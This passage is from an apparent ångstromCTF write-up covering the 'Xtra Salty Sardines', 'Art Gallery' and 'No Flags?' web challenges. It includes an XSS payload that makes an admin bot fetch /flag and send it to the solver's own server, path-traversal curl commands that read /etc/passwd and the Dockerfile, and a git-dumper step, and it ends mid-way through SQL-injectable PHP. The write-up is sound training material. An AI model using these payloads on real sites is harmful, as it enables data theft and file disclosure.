+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;please include a name&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// no pesky chars allowed
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>name</span>
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;&amp;&#34;</span>, <span style=color:#e6db74>&#34;&amp;amp;&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#39;&#34;&#39;</span>, <span style=color:#e6db74>&#34;&amp;quot;&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;&#39;&#34;</span>, <span style=color:#e6db74>&#34;&amp;apos;&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;&lt;&#34;</span>, <span style=color:#e6db74>&#34;&amp;lt;&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;&gt;&#34;</span>, <span style=color:#e6db74>&#34;&amp;gt;&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>2048</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>)
+</span></span><span style=display:flex><span>            .<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>)
+</span></span><span style=display:flex><span>            .<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;sardine name must be 1-2048 chars&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>genId</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>sardines</span>[<span style=color:#a6e22e>id</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>name</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>&#34;/sardines/&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>id</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>));
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/sardines/:sardine&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>sardines</span>[<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>sardine</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>name</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>404</span>).<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/plain&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;sardine not found :(&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sardine</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fs</span>
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>readFileSync</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;sardine.html&#34;</span>), <span style=color:#e6db74>&#34;utf8&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>&#34;$NAME&#34;</span>, <span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>&#34;$&#34;</span>, <span style=color:#e6db74>&#34;$$$$&#34;</span>));
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>type</span>(<span style=color:#e6db74>&#34;text/html&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>sardine</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>port</span>, () =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server listening on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>port</span><span style=color:#e6db74>}</span><span style=color:#e6db74>.`</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>Firstly, <a href=https://xtra-salty-sardines.web.actf.co>https://xtra-salty-sardines.web.actf.co</a>.</p><p>If you POST name to <code>/mksardine</code>, the page will transition and name will be displayed.
+In addition, the name is sanitized as follows.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>name</span>
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;&amp;&#34;</span>, <span style=color:#e6db74>&#34;&amp;amp;&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#39;&#34;&#39;</span>, <span style=color:#e6db74>&#34;&amp;quot;&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;&#39;&#34;</span>, <span style=color:#e6db74>&#34;&amp;apos;&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;&lt;&#34;</span>, <span style=color:#e6db74>&#34;&amp;lt;&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;&gt;&#34;</span>, <span style=color:#e6db74>&#34;&amp;gt;&#34;</span>);
+</span></span></code></pre></div><p>Now, if you send a payload like, <code>&lt;% foo>&lt;x foo="%>&lt;script>javascript:alert(1)&lt;/script>"></code> as name, XSS will fire. This payload was borrowed from <a href=https://github.com/payloadbox/xss-payload-list>xss-payload-list</a>.</p><p>There is also another site called <a href=https://admin-bot.actf.co/xtra-salty-sardines>admin bot</a> where admin bots can access <code>/flag</code>. And if you can access <code>/flag</code>, you will get flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#75715e>// the admin bot will be able to access this
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/flag&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>cookies</span>.<span style=color:#a6e22e>secret</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>secret</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;you can&#39;t view this &gt;:(&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>Here, send the following payload as name to get the URL that XSS fires. Have the admin bot GET <code>/flag</code> and send the response flag to its own server.</p><pre tabindex=0><code>&lt;% foo&gt;&lt;x foo=&#34;%&gt;&lt;script&gt;(async()=&gt;{hoge=await fetch(`https://xtra-salty-sardines.web.actf.co/flag`).then((res)=&gt;res.text());fetch(`https://&lt;URL of own server set up by request bin etc.&gt;/?flag=${hoge}`)})();&lt;/script&gt;&#34;&gt;
+</code></pre><p><img src=/images/posts/13/xtra_url.png alt=flag></p><p>If you send the URL that the acquired XSS fires with the admin bot, the flag will be sent to your server.</p><p><img src=/images/posts/13/xtra_adminbot.png alt=flag></p><p><img src=/images/posts/13/xtra_flag.png alt=flag></p><h1 id=web-art-gallery>[web] Art Gallery</h1><p>Problem Statement :</p><pre tabindex=0><code>bosh left his image gallery service running.... quick, git all of his secrets before he deletes them!!! source
+</code></pre><p>Promblem Server : <a href=https://art-gallery.web.actf.co/>https://art-gallery.web.actf.co/</a></p><p>Distributed Files : <code>index.js</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;express&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>path</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;path&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>port</span> <span style=color:#f92672>=</span> Number(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>PORT</span>) <span style=color:#f92672>||</span> <span style=color:#ae81ff>8080</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/gallery&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;images&#34;</span>, <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>member</span>), (<span style=color:#a6e22e>err</span>) =&gt; {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;error.html&#34;</span>))
+</span></span><span style=display:flex><span>    });
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>));
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>port</span>, () =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server listening on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>port</span><span style=color:#e6db74>}</span><span style=color:#e6db74>.`</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>Pay attention to the following part. Suspect Local File Inclusion (LFI) because you can insert any string into <code>req.query.number</code> and<code> res.sendFile</code> is executed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/gallery&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;images&#34;</span>, <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>member</span>), (<span style=color:#a6e22e>err</span>) =&gt; {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;error.html&#34;</span>))
+</span></span><span style=display:flex><span>    });
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>After trying various things, you can see that <code>/gallery?member=..///////..////..//////etc/passwd</code> can get <code>/etc/passwd</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl &#34;https://art-gallery.web.actf.co/gallery?member=..///////..////..//////etc/passwd&#34;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+</code></pre><p>Also, when I GET <code>/gallery</code>, I get an error. I know that the directory where the application is located is <code>/ app</code>.</p><pre tabindex=0><code>TypeError [ERR_INVALID_ARG_TYPE]: The &#34;path&#34; argument must be of type string. Received undefined
+    at new NodeError (node:internal/errors:372:5)
+    at validateString (node:internal/validators:120:11)
+    at Object.join (node:path:1172:7)
+    at /app/index.js:8:23
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
+    at next (/app/node_modules/express/lib/router/route.js:144:13)
+    at Route.dispatch (/app/node_modules/express/lib/router/route.js:114:3)
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
+    at /app/node_modules/express/lib/router/index.js:286:22
+    at Function.process_params (/app/node_modules/express/lib/router/index.js:348:12)
+</code></pre><p>Dockerfile can be taken with <code>/gallery?member=..///////..////..//////app/Dockerfile</code>.</p><pre tabindex=0><code>$ curl &#34;https://art-gallery.web.actf.co/gallery?member=..///////..////..//////app/Dockerfile&#34;
+FROM node:17-bullseye-slim
+
+WORKDIR /app
+COPY . .
+RUN mv git .git
+RUN npm ci
+
+ENV PORT=8080
+
+EXPOSE 8080
+
+CMD [&#34;node&#34;, &#34;index.js&#34;]
+</code></pre><p>You can see that the <code>.git</code> directory is located under <code>/ app</code>. Here, using <a href=https://github.com/arthaud/git-dumper>git-dumper</a>, dump the <code>.git</code> directory. Below, the <code>.git</code> directory is dumped under the local <code>./temp</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ git-dumper &#34;https://art-gallery.web.actf.co/gallery?member=..///////..////..//////app/.git&#34; ./temp
+</code></pre><p>If you look at the log, you can see that <code>flag.txt</code> was created and deleted.</p><pre tabindex=0><code>$ cd temp
+$ git log --stat
+commit 1c584170fb33ae17a63e22456f19601efb1f23db (HEAD -&gt; master)
+Author: imposter &lt;sus@aplet.me&gt;
+Date:   Tue Apr 26 21:47:45 2022 -0400
+
+    bury secrets
+
+commit 713a4aba8af38c9507ced6ea41f602b105ca4101
+Author: imposter &lt;sus@aplet.me&gt;
+Date:   Tue Apr 26 21:44:48 2022 -0400
+
+    remove vital secrets
+
+ flag.txt | 1 -
+ 1 file changed, 1 deletion(-)
+
+commit 56449caeb7973b88f20d67b4c343cbb895aa6bc7
+Author: imposter &lt;sus@aplet.me&gt;
+Date:   Tue Apr 26 21:44:01 2022 -0400
+
+    add program
+
+ error.html          |  16 ++++
+ flag.txt            |   1 +
+ images/aplet.jpg    | Bin 0 -&gt; 105281 bytes
+ images/cavocado.jpg | Bin 0 -&gt; 824702 bytes
+ images/clam.jpg     | Bin 0 -&gt; 26164 bytes
+ images/emh.jpg      | Bin 0 -&gt; 63584 bytes
+ index.html          |  25 +++++++
+ index.js            |  19 +++++
+ package-lock.json   | 432 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ package.json        |  15 ++++
+ 10 files changed, 508 insertions(+)
+</code></pre><p>If you refer to the commit where <code>flag.txt</code> existed, you can get the flag.</p><pre tabindex=0><code>$ git show 56449caeb7973b88f20d67b4c343cbb895aa6bc7:flag.txt
+actf{lfi_me_alone_and_git_out_341n4kaf5u59v}
+</code></pre><h1 id=web-no-flags>[web] No Flags?</h1><p>Problem Statement:</p><pre tabindex=0><code>After hearing about all of the cheating scandals, clam decided to conduct a sting operation for ångstromCTF. He made a database of fake flags to see who submits them. Unbeknownst to him, a spy managed to sneak a real flag into his database. Can you find it?
+</code></pre><p>Problem Server: <a href=https://no-flags.web.actf.co/>https://no-flags.web.actf.co/</a></p><p>Distributed Files:</p><p><code>Dockerfile</code></p><pre tabindex=0><code class=language-:Dockerfile data-lang=:Dockerfile>FROM php:8.1.5-apache-bullseye
+
+# executable that prints the flag
+COPY printflag /printflag
+RUN chmod 111 /printflag
+COPY src /var/www/html
+
+RUN chown -R root:root /var/www/html &amp;&amp; chmod -R 555 /var/www/html
+RUN mkdir /var/www/html/abyss &amp;&amp;\
+    chown -R root:root /var/www/html/abyss &amp;&amp;\
+    chmod -R 333 abyss
+
+EXPOSE 80
+</code></pre><p><code>index.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.php data-lang=:.php><span style=display:flex><span><span style=color:#75715e>&lt;?php</span> <span style=color:#a6e22e>session_start</span>(); <span style=color:#75715e>?&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>http-equiv</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;X-UA-Compatible&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;IE=edge&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>title</span>&gt;No Flags?&lt;/<span style=color:#f92672>title</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>style</span>&gt;
+</span></span><span style=display:flex><span>        <span style=color:#f92672>body</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>background-color</span>: <span style=color:#ae81ff>#f8bbd0</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>h1</span><span style=color:#f92672>,</span> <span style=color:#f92672>h2</span><span style=color:#f92672>,</span> <span style=color:#f92672>li</span><span style=color:#f92672>,</span> <span style=color:#f92672>input</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>color</span>: <span style=color:#ae81ff>#560027</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#f92672>h1</span><span style=color:#f92672>,</span> <span style=color:#f92672>h2</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>font-family</span>: <span style=color:#66d9ef>sans-serif</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>h1</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>font-size</span>: <span style=color:#ae81ff>36</span><span style=color:#66d9ef>px</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>h2</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>font-size</span>: <span style=color:#ae81ff>30</span><span style=color:#66d9ef>px</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>li</span><span style=color:#f92672>,</span> <span style=color:#f92672>input</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>font-size</span>: <span style=color:#ae81ff>24</span><span style=color:#66d9ef>px</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>font-family</span>: <span style=color:#66d9ef>monospace</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>input</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>background</span>: <span style=color:#66d9ef>none</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>border</span>: <span style=color:#ae81ff>1</span><span style=color:#66d9ef>px</span> <span style=color:#66d9ef>solid</span> <span style=color:#ae81ff>#880e4f</span>;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>border-radius</span>: <span style=color:#ae81ff>5</span><span style=color:#66d9ef>px</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>style</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>h1</span>&gt;List of Fake Flags&lt;/<span style=color:#f92672>h1</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>ul</span>&gt;
+</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;?php</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#34;DBNAME&#34;</span>])) {
+</span></span><span style=display:flex><span>            $dbname <span style=color:#f92672>=</span> <span style=color:#a6e22e>hash</span>(<span style=color:#e6db74>&#34;sha256&#34;</span>, (<span style=color:#a6e22e>string</span>) <span style=color:#a6e22e>rand</span>());
+</span></span><span style=display:flex><span>            $_SESSION[<span style=color:#e6db74>&#34;DBNAME&#34;</span>] <span style=color:#f92672>=</span> $dbname;
+</span></span><span style=display:flex><span>            $init <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            $dbname <span style=color:#f92672>=</span> $_SESSION[<span style=color:#e6db74>&#34;DBNAME&#34;</span>];
+</span></span><span style=display:flex><span>            $init <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        $pdo <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>PDO</span>(<span style=color:#e6db74>&#34;sqlite:/tmp/</span><span style=color:#e6db74>$dbname</span><span style=color:#e6db74>.db&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($init) {
+</span></span><span style=display:flex><span>            $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;CREATE TABLE Flags (flag string); INSERT INTO Flags VALUES (&#39;actf{not_the_flag}&#39;), (&#39;actf{maybe_the_flag}&#39;)&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#34;flag&#34;</span>])) {
+</span></span><span style=display:flex><span>            $flag <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#34;flag&#34;</span>];
+</span></span><span style=display:flex><span>            $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;INSERT INTO Flags VALUES (&#39;</span><span style=color:#e6db74>$flag</span><span style=color:#e6db74>&#39;);&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span> ($pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#34;SELECT * FROM Flags&#34;</span>) <span style=color:#66d9ef>as</span> $row) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;li&gt;&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>htmlspecialchars</span>($row[<span style=color:#e6db74>&#34;flag&#34;</span>]) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;&lt;/li&gt;&#34;</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    <span style=color:#75715e>?&gt;</span>
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>ul</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>h2</span>&gt;Add a Fake Flag&lt;/<span style=color:#f92672>h2</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;POST&#34;</span>&gt;
